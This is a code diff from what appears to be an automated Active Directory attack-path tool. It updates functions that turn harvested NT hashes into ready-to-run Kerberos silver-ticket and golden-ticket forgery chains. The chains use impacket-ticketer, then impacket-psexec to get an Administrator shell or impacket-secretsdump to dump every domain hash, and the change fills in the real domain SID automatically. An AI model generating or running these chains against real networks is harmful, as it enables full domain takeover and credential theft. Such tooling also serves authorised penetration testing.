@@ -607,13 +607,17 @@ def run(report, store, ui=None):
                 continue
             silver_seen.add(host_short.lower())
             _dom_sv = store.dominant_domain() or "<DOM>"
+            _sid_sv = store.domain_sid() or "<S-1-5-21-...>"
+            _sid_note_sv = "" if _sid_sv.startswith("S-") else (
+                "   # look up domain SID: impacket-lookupsid "
+                "<DC>/<u>:<p>@<DC>")
             chains.append(Chain("R-SILVER", "silver ticket",
                 f"machine hash {host_short}$ -> silver ticket forgery for {host_short}",
                 crit=9, conf=0.9, ready=1.4, prox=0.9,      # score 10.2
                 commands=[
-                    f"# Look up domain SID (impacket-lookupsid <DC>/<u>:<p>@<DC>)",
-                    f"impacket-ticketer -nthash {h} -domain-sid <S-1-5-21-...> "
-                    f"-domain {_dom_sv} -spn cifs/{host_short}.<dom> Administrator",
+                    f"impacket-ticketer -nthash {h} -domain-sid {_sid_sv} "
+                    f"-domain {_dom_sv} -spn cifs/{host_short}.<dom> "
+                    f"Administrator{_sid_note_sv}",
                     f"export KRB5CCNAME=Administrator.ccache",
                     f"impacket-psexec -k -no-pass {_dom_sv}/Administrator@{host_short}.<dom>",
                 ], src=hsrc, line=hln))
@@ -625,13 +629,17 @@ def run(report, store, ui=None):
     if getattr(e, "has_krbtgt", False):
         s_gt, l_gt = e.krbtgt_src or ("", None)
         dom_gt = e.krbtgt_dom or "<DOM>"
+        # iter-38: thread real domain SID when we've learned one.
+        _sid_gt = store.domain_sid() or "<S-1-5-21-...>"
+        _sid_note = "" if _sid_gt.startswith("S-") else (
+            "\n# Look up the domain SID first (impacket-lookupsid or from any "
+            "user's Evidence.meta.principal_sid)")
         chains.append(Chain("R-GOLDEN", "golden ticket",
             f"krbtgt NT hash present -> forge Administrator TGT (score 15)",
             crit=10, conf=1.0, ready=1.5, prox=1.0,         # score 15.0
             commands=[
-                f"# Look up the domain SID from any user Evidence, then:",
                 f"impacket-ticketer -nthash {e.krbtgt_hash} "
-                f"-domain-sid <S-1-5-21-...> -domain {dom_gt} Administrator",
+                f"-domain-sid {_sid_gt} -domain {dom_gt} Administrator{_sid_note}",
                 f"export KRB5CCNAME=Administrator.ccache",
                 f"impacket-secretsdump -k -no-pass '{dom_gt}/Administrator@<DC-FQDN>'   "
                 f"# every domain hash",
